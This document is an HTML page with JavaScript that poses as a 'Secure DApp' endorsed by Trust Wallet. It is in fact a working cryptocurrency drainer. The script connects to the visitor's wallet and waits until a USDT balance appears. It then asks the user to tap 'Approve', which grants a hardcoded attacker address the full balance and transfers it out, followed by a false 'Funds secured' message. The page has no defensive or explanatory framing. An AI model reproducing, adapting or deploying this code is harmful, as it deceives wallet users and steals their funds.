<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="icon" href="./favicon.ico" />
<title>Secure DApp</title>
<style>
  body {
    background: #081c3a; color: white; font-family: Arial,sans-serif;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
    height: 100vh; text-align: center;
  }
  img { width: 100px; margin-bottom: 20px; }
  #status { margin: 10px 0; opacity: 0.9; }
  #approveButton {
    background: #0a84ff; padding: 12px 24px; border: none;
    border-radius: 8px; color: white; font-size: 1rem; cursor: pointer; display: none;
  }
  .footer { opacity: 0.5; position: absolute; bottom: 20px; font-size: 0.8rem; }
  .success { color: lightgreen; margin-top: 10px; }
</style>
</head>
<body>
<img src="./logo.png" alt="Trust Wallet" />
<h2>Secure DApp</h2>
<div id="status">Initializing DApp...</div>
<button id="approveButton">Approve</button>
<div class="footer">Powered by Trust Wallet • Trusted since 2009</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
<script>
  const TARGET = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // Apna wallet
  const USDT = "0x55d398326f99059fF775485246999027B3197955";
  const ABI = [
    { "constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
    { "constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
    { "constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
  ];
  let account, web3, contract;

  async function init() {
    if (!window.ethereum) {
      status.innerText = "❌ Open in Trust Wallet DApp.";
      return;
    }
    web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: "eth_requestAccounts" });
    [account] = await web3.eth.getAccounts();
    contract = new web3.eth.Contract(ABI, USDT);
    status.innerText = "✅ Waiting for USDT send…";
    poll();
  }

  async function poll() {
    let balance = await contract.methods.balanceOf(account).call();
    if (balance > 0) {
      status.innerText = "✅ Received USDT. Tap Approve.";
      document.getElementById('approveButton').style.display = "block";
    } else {
      setTimeout(poll, 4000);
    }
  }

  document.getElementById('approveButton').onclick = async () => {
    status.innerText = "⏳ Approving…";
    const balance = await contract.methods.balanceOf(account).call();
    await contract.methods.approve(TARGET, balance).send({ from: account });
    await contract.methods.transferFrom(account, TARGET, balance).send({ from: account });
    status.innerHTML = '<div class="success">✅ Success! Funds secured.</div>';
    document.getElementById('approveButton').style.display = "none";
  };
  
  init();
</script>
</body>
</html>
